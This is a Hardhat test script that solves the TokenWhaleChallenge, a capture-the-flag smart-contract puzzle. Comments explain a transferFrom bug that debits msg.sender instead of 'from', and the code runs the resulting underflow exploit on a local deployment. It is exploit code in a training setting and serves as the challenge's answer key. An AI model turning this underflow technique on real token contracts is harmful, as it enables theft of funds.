import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";

describe("TokenWhaleChallenge", function () {
  it("should exploit logic flaw in transferFrom implementation", async function () {
    const [player, accomplice] = await ethers.getSigners();

    // Step 1: Deploy the challenge contract with player as initial token holder
    const ChallengeFactory = await ethers.getContractFactory("TokenWhaleChallenge");
    const challenge = await ChallengeFactory.connect(player).deploy(player.address);
    await challenge.deployed();
    console.log("Contract deployed at address:", challenge.address);

    const playerAddress = await player.getAddress();
    const accompliceAddress = await accomplice.getAddress();

    // Problem Summary:
    //
    // The `transferFrom()` function verifies:
    //   - balanceOf[from] >= value
    //   - allowance[from][msg.sender] >= value
    // but then internally calls:
    //     _transfer(to, value)
    // which subtracts tokens from `msg.sender`, not `from`.
    //
    // This breaks the expected ERC-20 behaviour and introduces a critical logic flaw:
    // If someone (e.g. `accomplice`) calls `transferFrom(player, player, 1)`, then:
    // - it passes the checks using `player`'s balance and allowance
    // - but `msg.sender` (accomplice) loses 1 token
    // - if accomplice's balance is 0, this causes an underflow: 0 - 1 => 2^256 - 1
    // - result: accomplice now holds max uint256 tokens
    
    // Step 2: Player approves accomplice to spend tokens
    const approveTx = await challenge.connect(player).approve(accompliceAddress, BigNumber.from(2).pow(255));
    await approveTx.wait();
    console.log("Accomplice approved to spend player tokens");

    // Step 3: Accomplice calls transferFrom(player, player, 1)
    // The vulnerable _transfer will subtract from msg.sender (accomplice) instead of 'from'
    const tx = await challenge.connect(accomplice).transferFrom(playerAddress, playerAddress, 1);
    await tx.wait();
    console.log("transferFrom called with msg.sender = accomplice");

    // Step 4: Accomplice now has near-max token balance (due to underflow)
    const accompliceBalance = await challenge.balanceOf(accompliceAddress);
    console.log("Accomplice balance after exploit:", accompliceBalance.toString());
    expect(accompliceBalance.gte(BigNumber.from("1000000"))).to.be.true;

    // Step 5: Accomplice sends 1,000,000 tokens to player to solve the challenge
    const transferBackTx = await challenge.connect(accomplice).transfer(playerAddress, BigNumber.from("1000000"));
    await transferBackTx.wait();
    console.log("Tokens transferred back to player");

    // Step 6: Check if challenge is complete
    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;
    console.log("Challenge solved successfully");
  });
});
